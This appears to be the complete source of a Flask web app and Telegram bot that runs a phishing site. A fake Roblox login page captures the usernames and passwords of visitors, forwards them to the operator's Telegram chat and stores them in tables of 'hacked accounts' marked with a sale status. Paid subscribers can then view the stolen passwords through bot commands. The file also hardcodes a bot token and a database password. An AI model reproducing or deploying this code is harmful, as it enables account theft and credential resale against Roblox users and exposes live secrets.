from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === Настройки ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # Ваш токен
ADMIN_CHAT_ID = '6956377285'  # Ваш chat_id (Создатель)
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Змінні для техперериву ===
tech_break = None

# === Ініціалізація бази даних ===
def get_db_connection():
    try:
        conn = psycopg2.connect(DATABASE_URL)
        print("DB connection successful")
        return conn
    except Exception as e:
        print(f"DB connection failed: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        print("Failed to initialize DB - proceeding without DB")
        return False
    try:
        c = conn.cursor()
        print("Creating table 'users' if not exists")
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
        print("Creating table 'credentials' if not exists")
        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
        print("Creating table 'hacked_accounts' if not exists")
        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
        subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
        print(f"Ensuring Создатель for {ADMIN_CHAT_ID}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                  (ADMIN_CHAT_ID, "Создатель", subscription_end))
        conn.commit()
        conn.close()
        print("DB initialized successfully")
        return True
    except Exception as e:
        print(f"DB initialization error: {e}")
        conn.close()
        return False

# === Keep-alive для Render ===
def keep_alive():
    while True:
        try:
            requests.get(SITE_URL)
            print("🔁 Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)

# === Функції для роботи з базою ===
def get_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"Failed to get user {chat_id}: no DB connection")
        if chat_id == ADMIN_CHAT_ID:
            print(f"Hardcoding Создатель for {chat_id}")
            return {
                'prefix': 'Создатель',
                'subscription_end': datetime.now() + timedelta(days=3650),
                'site_clicks': 0,
                'password_views': 0
            }
        return None
    try:
        c = conn.cursor()
        c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            print(f"User {chat_id} found: {result}")
            return {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'site_clicks': result[2],
                'password_views': result[3]
            }
        print(f"User {chat_id} not found")
        return None
    except Exception as e:
        print(f"Error in get_user for {chat_id}: {e}")
        conn.close()
        return None

def save_user(chat_id, prefix, subscription_end):
    conn = get_db_connection()
    if conn is None:
        print(f"Failed to save user {chat_id}: no DB connection")
        return
    try:
        c = conn.cursor()
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                  (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
        conn.commit()
        conn.close()
        print(f"User {chat_id} saved with prefix {prefix}")
    except Exception as e:
        print(f"Error saving user {chat_id}: {e}")
        conn.close()

def get_credentials():
    conn = get_db_connection()
    if conn is None:
        print("Failed to get credentials: no DB connection")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        print(f"Credentials fetched: {result}")
        return result
    except Exception as e:
        print(f"Error fetching credentials: {e}")
        conn.close()
        return []

def get_hacked_accounts():
    conn = get_db_connection()
    if conn is None:
        print("Failed to get hacked accounts: no DB connection")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        print(f"Hacked accounts fetched: {result}")
        return result
    except Exception as e:
        print(f"Error fetching hacked accounts: {e}")
        conn.close()
        return []

def get_all_users():
    conn = get_db_connection()
    if conn is None:
        print("Failed to get all users: no DB connection")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
        result = c.fetchall()
        conn.close()
        print(f"All users fetched: {result}")
        return result
    except Exception as e:
        print(f"Error fetching all users: {e}")
        conn.close()
        return []

# === Перевірка доступу ===
def check_access(chat_id, command):
    global tech_break
    print(f"Checking access for {chat_id} on command {command}")
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - datetime.now()).total_seconds() / 60
        if time_left > 0:
            return f"⏳ Сейчас проходит техперерыв. Конец будет через {int(time_left)} минут."
    user = get_user(chat_id)
    if not user or user['prefix'] == 'Посетитель':
        return "🔒 Вы можете купить подписку у @sacoectasy."
    if user['subscription_end'] and user['subscription_end'] < datetime.now():
        save_user(chat_id, 'Посетитель', datetime.now())
        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy."
    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
        return "🔒 Доступно только для Админа и Создателя!"
    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
        return "🔒 Доступно только для Создателя!"
    print(f"Access granted for {chat_id} on {command}")
    return None

# === Flask маршрути ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            print(f"Received login: {login}, password: {password}")
            bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Error in /submit: {e}")
        return "Internal Server Error", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        print(f"Received webhook data: {json_string}")
        update = telebot.types.Update.de_json(json_string)
        if update and update.message:
            print(f"Processing update: {update.message.text}")
            bot.process_new_updates([update])
        else:
            print("No valid update found in webhook data")
        return 'OK', 200
    print("Invalid webhook request")
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup():
    try:
        bot.remove_webhook()
        webhook_url = f"{SITE_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        init_db()
        print(f"Webhook set to {webhook_url}")
        return "Webhook and DB set", 200
    except Exception as e:
        print(f"Setup failed: {e}")
        return f"Setup failed: {e}", 500

# === Команди бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /start for chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "✅ Бот активен! Используйте /menu для списка команд.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /menu for chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access)
        return
    user = get_user(chat_id)
    if user:
        time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
        time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}"
        if tech_break:
            tech_time_left = (tech_break - datetime.now()).total_seconds() / 60
            if tech_time_left > 0:
                response += f"\n⏳ Техперерыв: до {tech_break.strftime('%H:%M')} (UTC+2), осталось {int(tech_time_left)} мин."
            else:
                tech_break = None
        response += "\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop\n/techstopoff"
        if user['prefix'] in ['Админ', 'Создатель']:
            response += "\n/passwords\n/admin"
        if user['prefix'] == 'Создатель':
            response += "\n/hacked\n/database\n/adprefix\n/delprefix"
    else:
        response = "🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
    bot.reply_to(message, response)

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /site for chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /getchatid for chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstop for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
        return
    minutes = int(args[0])
    tech_break = datetime.now() + timedelta(minutes=minutes, hours=2)  # +2 часа для часового пояса
    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')} (UTC+2)")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstopoff for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    tech_break = None
    bot.reply_to(message, "✅ Техперерыв отключен.")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /passwords for chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access)
        return
    credentials = get_credentials()
    if not credentials:
        bot.reply_to(message, "📂 Список паролей пуст.")
        return
    response = "🔑 Список паролей:\n"
    for login, password, added_time in credentials:
        response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /hacked for chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    hacked_accounts = get_hacked_accounts()
    if not hacked_accounts:
        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.")
        return
    response = "🔓 Взломанные аккаунты:\n"
    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
        response += (f"Логин: {login} | Пароль: {password} | Дата: {hack_date} | "
                     f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
    bot.reply_to(message, response)

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /database for chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    conn = get_db_connection()
    if conn is None:
        bot.reply_to(message, "❌ Не удалось подключиться к базе данных.")
        return
    try:
        c = conn.cursor()
        if not args:
            c.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")
            tables = c.fetchall()
            response = "📊 Таблицы в базе:\n" + "\n".join(table[0] for table in tables)
            response += "\n\nИспользуйте: /database <действие> <таблица> <значение>\nДействия: add, delete\nТаблицы: users, credentials, hacked"
        elif args[0] == "add":
            if args[1] == "users" and len(args) == 5:
                chat_id, prefix, days = args[2], args[3], int(args[4])
                subscription_end = datetime.now() + timedelta(days=days)
                c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                          "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                          (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
                response = f"✅ Добавлен пользователь {chat_id} с префиксом {prefix} на {days} дней."
            elif args[1] == "credentials" and len(args) == 4:
                login, password = args[2], args[3]
                c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                          "ON CONFLICT (login) DO NOTHING",
                          (login, password, datetime.now().isoformat()))
                response = f"✅ Добавлен логин {login} с паролем {password}."
            else:
                response = "❌ Формат: /database add <таблица> <значения>"
        elif args[0] == "delete":
            if args[1] == "users" and len(args) == 3:
                chat_id = args[2]
                c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
                response = f"✅ Удален пользователь {chat_id}."
            elif args[1] == "credentials" and len(args) == 3:
                login = args[2]
                c.execute("DELETE FROM credentials WHERE login = %s", (login,))
                response = f"✅ Удален логин {login}."
            else:
                response = "❌ Формат: /database delete <таблица> <значение>"
        else:
            response = "❌ Действие не распознано. Используйте: add, delete"
        conn.commit()
        conn.close()
        bot.reply_to(message, response)
    except Exception as e:
        print(f"Error in /database: {e}")
        conn.close()
        bot.reply_to(message, "❌ Ошибка при запросе к базе.")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /admin for chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access)
        return
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📂 Список пользователей пуст.")
        return
    response = "👑 Панель администратора\nСписок пользователей:\n"
    for chat_id, prefix, subscription_end, site_clicks, password_views in users:
        time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
        response += (f"Chat ID: {chat_id}\n"
                     f"Префикс: {prefix}\n"
                     f"Подписка: {time_left} дней\n"
                     f"Кликов на сайт: {site_clicks}\n"
                     f"Просмотров паролей: {password_views}\n\n")
    bot.reply_to(message, response)

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /adprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) < 3 or not args[2].isdigit():
        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПрефиксы: Админ, Пользователь")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ["Админ", "Пользователь"]:
        bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь")
        return
    subscription_end = datetime.now() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс {prefix} на {days} дней.")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /delprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
        return
    target_chat_id = args[0]
    save_user(target_chat_id, "Посетитель", datetime.now())
    bot.reply_to(message, f"✅ Префикс пользователя {target_chat_id} сброшен до Посетитель.")

init_db()  # Ініціалізація при запуску

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
